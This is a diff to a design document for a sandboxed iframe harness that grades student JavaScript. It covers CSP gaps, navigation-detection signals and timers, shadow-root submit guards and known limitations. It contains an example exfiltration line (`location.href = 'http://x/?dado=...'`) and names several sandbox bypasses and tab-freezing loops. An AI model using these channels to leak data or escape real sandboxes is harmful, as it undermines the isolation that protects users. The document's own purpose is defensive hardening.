@@ -31,7 +31,18 @@ the only place where untrusted code executes.
   fonts and media to `data:`/`blob:`. The harness additionally replaces
   `fetch`: URLs listed in `challenge.mocks` resolve with a synthetic 200
   response; every other URL rejects with
-  `TypeError("Rede bloqueada no DIW Arcade: " + url)`.
+  `TypeError("Rede bloqueada no DIW Arcade: " + url)`. This does not cover
+  self-navigation: `location.href = 'http://x/?dado=...'` or a
+  `<meta http-equiv="refresh">` sends a top-level request of the frame itself,
+  which neither `connect-src` nor `form-action` governs and which the CSP meta
+  cannot block. It is a pre-existing channel (it was open before the
+  lifecycle signals and `allow-forms`) and this change does not widen it. The
+  harness reports such a navigation as the NAVIGATION failure, but only after
+  the request is sent. Mitigations considered: `navigate-to` in the CSP (never
+  shipped in browsers), a `Worker`-based grader (out of scope), blocking
+  navigation from the harness (`beforeunload` cannot cancel it reliably in a
+  sandboxed frame). The data in the frame is a student's own challenge code,
+  within the threat model above, so it is accepted.
 - **Messages:** the parent accepts a message only when `event.source` is the
   iframe's `contentWindow`, the embedded nonce matches, and the zod schema in
   `messages.ts` parses. Anything else is ignored.
@@ -127,12 +138,15 @@ iframe window, the nonce matches and the zod schema parses. States:
 
 - loading, `diw:started` -> running; start timer fires -> fail with
   "O ambiente de testes não iniciou. Tente executar de novo.";
-- running, a second `diw:started` or `diw:unload` -> fail with
+- running, a second `diw:started` -> fail at once with
   "O código recarregou ou navegou a página (location.reload / location.href).";
-  `diw:unload` while loading is the same failure;
+  `diw:unload` (also while loading) starts a `UNLOAD_GRACE_MS` timer that fails
+  with the same message, and `diw:survived` cancels it (see "`diw:unload` is
+  provisional" below);
 - running, total timer fires -> fail with "Tempo esgotado (loop infinito?)";
 - `diw:result` (test) or `diw:ready` (preview) -> ok. After settling the
-  listener is gone, so later `diw:unload` messages are ignored.
+  listener is gone and the grace timer is cleared, so later `diw:unload` and
+  `diw:survived` messages are ignored.
 
 A failure removes the iframe and resolves `{ status: "timeout" }` with every
 requirement failed with that message and `errors` set to `[message]`; the
@@ -141,17 +155,38 @@ preview lists the same text. Inside the harness, `describeError` is total, and
 per-requirement try/catch still posts a `diw:result` with every missing
 requirement failed ("Erro interno ao avaliar os requisitos.").
 
+`diw:unload` is provisional. `pagehide` alone is not enough: for
+`location.href = 'about:blank'` Chromium detaches the frame before the message
+is delivered, so the harness also listens to `beforeunload`. But
+`beforeunload` fires for navigations that never unload the page
+(`location.href = 'mailto:...'`, a click on `<a href="mailto:">` or `tel:`).
+So the harness sets a 30 ms timer on `beforeunload` and posts `diw:survived`
+if `pagehide` has not fired; the parent waits `UNLOAD_GRACE_MS` (200 ms) after
+a `diw:unload` before failing with the navigation message, and cancels the
+pending failure on `diw:survived` (a `diw:result` or `diw:ready` settles the
+run anyway). A real reload still fails at once through the second
+`diw:started`; an `about:blank` navigation fails after the grace period (about
+230 ms measured end to end). A real unload after a survived one re-arms the
+grace period. A `mailto:` assigned while the document is still loading gets no
+answer in headless Chromium (measured, cause not investigated) and the run
+ends as a timeout; this predates the signals and is not handled.
+
 Limits. A synchronous infinite loop in the frame is only interrupted when the
 browser runs the sandboxed (opaque-origin) frame in its own process; without
 that isolation the loop blocks the page, the parent's timers cannot fire and
-no message arrives. The timers cover asynchronous stalls and a harness that
+no message arrives. `while (true) {}` and a microtask-starvation loop
+(`function f() { Promise.resolve().then(f); }`) both freeze a non-isolated
+tab the same way. The timers cover asynchronous stalls and a harness that
 never starts. A Worker-based grader that could stop such loops is out of scope.
 `runInJsdom` uses the same 3000 ms for asynchronous stalls and cannot detect
 navigation. `form.submit()` fires no `submit` event and reloads a sandboxed
 srcdoc even with `form-action 'none'`, so the harness replaces
 `HTMLFormElement.prototype.submit` with a no-op; `location.reload()` and
 `location.href` are not neutralised and are reported through the signals
-above. `npm run smoke -- --runner` proves reload, `href = 'about:blank'` (a
+above. Known limitation: an `<a href="#x">` click navigates the srcdoc frame
+to the parent URL plus the hash, because `about:srcdoc` inherits the parent
+base URL. That is a real navigation of the frame; it is now reported as the
+navigation failure instead of a 3 s timeout, and it is not intercepted. `npm run smoke -- --runner` proves reload, `href = 'about:blank'` (a
 signal within 1500 ms) and `location.hash` (no signal, graded normally) in
 real Chromium.
 
@@ -178,6 +213,13 @@ allow-forms'`. It is safe because:
   (measured: the `start` and `pagehide` messages repeat). The harness replaces
   `HTMLFormElement.prototype.submit` with a no-op. `requestSubmit()` fires a
   `submit` event and is covered by the guard;
+- `submit` is not composed, so a form inside a shadow root never reaches the
+  window listener. The harness wraps `Element.prototype.attachShadow` and adds
+  the same capture-phase `preventDefault` listener to every shadow root it
+  creates, open or closed (probed in Chromium). Declarative shadow DOM
+  (`<template shadowrootmode>`) is built by the parser without calling
+  `attachShadow`, so a submit inside it is not guarded (not probed); a reload it
+  causes would be reported as the navigation failure. Known limitation;
 - the real-browser probe (below) proves the isolation: `parent.document`,
   `localStorage` and cookies are unreachable, `top.location` assignment does
   not move the parent, `window.open` returns `null`, and forms with
@@ -187,8 +229,10 @@ allow-forms'`. It is safe because:
 
 `npm run smoke -- --runner` (ADR-0003) runs the same srcdoc, harness and
 sandbox flags in Chromium: submit with and without `preventDefault`,
-`form.submit()`, `requestSubmit()`, the isolation checks, every reference
-solution and the n20-c02 starter as a negative control. It closes the jsdom
+`form.submit()`, `requestSubmit()`, forms inside shadow roots, the isolation
+checks (asserted from the parent, since no marker inside the frame can prove
+that `top.location` assignment was contained), `mailto:`/`tel:` navigations, every reference solution and the n20-c02
+starter as a negative control. It closes the jsdom
 divergence above: the validator can say a solution passes while the sandbox
 blocks it, and only the probe sees that.
 
